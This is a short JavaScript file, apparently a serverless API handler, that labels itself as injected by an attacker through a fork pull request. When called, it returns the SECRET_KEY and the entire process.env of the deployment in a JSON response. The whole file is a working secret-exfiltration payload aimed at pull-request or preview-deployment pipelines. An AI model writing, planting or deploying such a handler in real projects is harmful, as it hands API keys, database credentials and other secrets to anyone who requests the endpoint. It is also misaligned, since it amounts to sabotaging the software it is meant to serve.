module.exports = (req, res) => {
  res.json({
    message: "Injected by attacker via fork PR",
    victim_secrets: {
      SECRET_KEY: process.env.SECRET_KEY || "not_found"
    },
    all_environment: process.env
  });
};
